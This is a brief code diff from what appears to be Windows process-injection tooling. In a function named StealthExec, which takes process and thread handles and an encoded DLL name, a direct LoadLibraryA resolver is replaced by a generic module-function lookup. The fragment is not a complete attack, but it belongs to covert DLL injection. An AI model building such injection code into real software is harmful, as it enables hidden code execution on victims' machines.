@@ -15,7 +15,7 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
     NTSTATUS status;
 
     // Resolve Required Functions
-    pLoadLibraryA pLLoad = GetLoadLibraryA();
+    pMod pLLoad = GetMod("kernel32.dll", "LoadLibraryA");
 
     if (!pLLoad) {
         printf("[!] Failed to resolve LoadLibraryA.\n");
